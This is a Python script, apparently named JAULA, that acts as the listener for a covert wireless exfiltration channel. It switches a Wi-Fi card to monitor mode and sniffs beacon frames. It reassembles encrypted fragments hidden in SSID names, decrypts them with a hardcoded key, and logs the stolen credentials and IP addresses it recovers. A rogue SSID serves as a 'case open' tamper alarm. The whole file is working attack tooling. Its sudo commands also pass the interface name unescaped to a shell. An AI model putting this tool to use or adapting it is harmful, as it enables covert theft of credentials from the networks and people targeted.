#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import sys
import re
import argparse
import subprocess
import collections
import threading
import time
import pyaes
import pyscrypt
from pyfiglet import Figlet
from scapy.all import Dot11, Dot11Elt, Dot11Beacon, sniff

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.6"

# Config
PHRASE = 'Waaaaa! awesome :)'
SALT = 'salgruesa'
SSIDROOT = 'aterm-c17c02'
SSIDALARM = 'pacman'
WIFICHANNEL = '10'
DEBUG = False


# Classes
class APHandler(threading.Thread):
    """
    Class to observe 802.11 Becon packets
    and decrypt credentials inside SSID name
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
        self.dic = {}
        self.pkttotal = 0
        self.pktlen = 0
        self.cnt = True
        self.sid = []

    def pkt_callback(self, pkt):
        # Look for beacon with SSIDROOT as starting SSID
        # grab crypto len & amount of SSID's with crypto on it (use -g on those)
        if pkt.haslayer(Dot11Beacon):
            if (pkt[Dot11Elt].info == SSIDALARM) and (pkt[Dot11].SC == 666):
                printalarm(self.fd)
            if (pkt[Dot11Elt].info == SSIDROOT) and (self.cnt):
                self.pkttotal = pkt[Dot11].SC
                self.pktlen = pkt[Dot11Beacon].beacon_interval
                self.cnt = False
            elif ('aterm' and '-g' in pkt[Dot11Elt].info):
                if pkt[Dot11Beacon].beacon_interval == self.pktlen:
                    if str(pkt[Dot11Elt].info).split('-')[1] not in self.sid:
                        self.dic[pkt[Dot11].SC] = str(pkt[Dot11Elt].info).split('-')[1]
                        self.sid.append(str(pkt[Dot11Elt].info).split('-')[1])
            if (len(self.dic) == self.pkttotal) and (self.pkttotal > 0):
                odic = collections.OrderedDict(sorted(self.dic.items()))
                final = ''
                for k, v in odic.iteritems():
                    final = final + v
                text = decrypt(final[:self.pktlen])
                text = text.strip()
                hexip = text.split(',')[-1]
                text = text.replace(hexip, hextoip(hexip))
                printer(self.fd, text)
                self.dic = {}
                self.sid = []
                self.pktlen = 0
                self.pkttotal = 0
                self.cnt = True

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, store=0)

    def join(self):
        self.stoprequest.set()


# Functions

def printer(fd, text):
    if DEBUG:
        print('Receive Credentails via Wireless Beacon:')
        print(time.strftime("%Y-%m-%d %H:%M:%S ",
              time.gmtime()) + text)
    find = re.compile('\\b' + text + '\\b')
    with open(fd, 'a+') as sfile:
        with open(fd, 'r') as xfile:
            m = find.findall(xfile.read())
            if not m:
                sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                            time.gmtime()) + text + '\n')

def printalarm(fd):
    text = 'ALARM Case Open!'
    with open(fd, 'a+') as sfile:
        sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text + '\n')
    if DEBUG:
        print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text)
    print('Sayonara')
    sys.exit(1)

def decrypt(ciphertxt):
    hashed = pyscrypt.hash(PHRASE, SALT, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    cleartxt = aes.decrypt(ciphertxt.decode('hex'))
    return cleartxt

def hextoip(ip):
    n = 2
    return '.'.join([str(int(ip[i:i+n], 16)) for i in range(0, len(ip), n)])

def parsingopt():
    f = Figlet(font='standard')
    print(f.renderText('JAULA'))
    print('Author: ' + __author__)
    print('Version: ' + __version__ + '\n')
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument('-v', '--verbose',
                        action='store_true', help='Enable debugging')
    parser.add_argument('-i', required=True,
                        metavar='<wlan1>', dest='wnic', help='wlan int')
    parser.add_argument('-f', required=True,
                        metavar='<file>', dest='fd', help='Output file')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        parser.print_help()
        sys.exit(1)

# Main Function

def main():
    global DEBUG
    options = parsingopt()
    if options.verbose:
        DEBUG = True

    subprocess.call('sudo ip link set ' + options.wnic + ' down', shell=True)
    time.sleep(0.3)
    subprocess.call('sudo iw ' + options.wnic + ' set monitor control', shell=True)
    time.sleep(0.3)
    subprocess.call('sudo ip link set ' + options.wnic + ' up', shell=True)
    time.sleep(0.3)
    subprocess.call('sudo iw ' + options.wnic + ' set channel ' + WIFICHANNEL, shell=True)

    apdh = APHandler(options.wnic, options.fd)
    apdh.daemon = True
    apdh.start()

    if DEBUG:
        print('Listening.....')

    # Running loop
    try:
        while True:
            pass
    except KeyboardInterrupt:
        apdh.join()
        subprocess.call('sudo ip link set ' + options.wnic + ' down', shell=True)
        time.sleep(0.3)
        subprocess.call('sudo iw ' + options.wnic + ' set monitor control', shell=True)
        time.sleep(0.3)
        subprocess.call('sudo ip link set ' + options.wnic + ' up', shell=True)
        time.sleep(0.3)
        sys.exit(0)


# Call main
if __name__ == '__main__':
    main()
